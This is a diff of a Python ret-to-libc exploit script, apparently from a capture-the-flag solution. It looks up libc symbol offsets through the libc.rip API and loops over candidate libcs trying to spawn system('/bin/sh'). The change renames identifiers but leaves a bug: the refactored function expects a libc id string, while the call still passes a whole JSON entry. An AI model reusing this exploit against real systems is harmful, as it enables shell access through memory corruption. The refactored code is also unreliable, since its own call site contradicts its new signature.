@@ -16,7 +16,7 @@ buffSize = 132
 
 # URLs and Headers for API Requests
 findLibcUrl = 'https://libc.rip/api/find'
-libcSearchUrl = "https://libc.rip/api/libc/"
+LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
 HEADERS = {'Content-Type': 'application/json'}
 
 # Function Offsets
@@ -112,16 +112,15 @@ def find_potential_libcs(puts_addr,gets_addr):
     return response.json()
 
 # Find the offsets of functions and '/bin/sh' from the current libc json
-def getLibcSymbolOffsets(libcJson):
+def get_libc_symbol_offsets(libc_id):
     # Get the libc id to perform a more thorough search of functions
-    libId = libcJson['id']
-    libcUrl = libcSearchUrl+libId
+    libc_url = LIBC_SEARCH_URL + libc_id
     
     # Define extra symbols to retrieve from the database
     findSymbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}
 
     # Request symbols from the datatbase
-    response = requests.post(libcUrl, headers=HEADERS, data=json.dumps(findSymbols))
+    response = requests.post(libc_url, headers=HEADERS, data=json.dumps(findSymbols))
     symbolJson = response.json()
 
     # Store the symbols into variables
@@ -142,7 +141,7 @@ def main():
     # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
     for item in responseJson:
         # Get the symbol offsets for the specific libc version
-        putsOff, systemOff, exitOff, bin_shOff = getLibcSymbolOffsets(item)
+        putsOff, systemOff, exitOff, bin_shOff = get_libc_symbol_offsets(item)
 
         # Attempt to execute system('/bin/sh')
         retVal = attemptR2Libc(int(putsOff,16),int(systemOff,16),int(exitOff,16),int(bin_shOff,16))
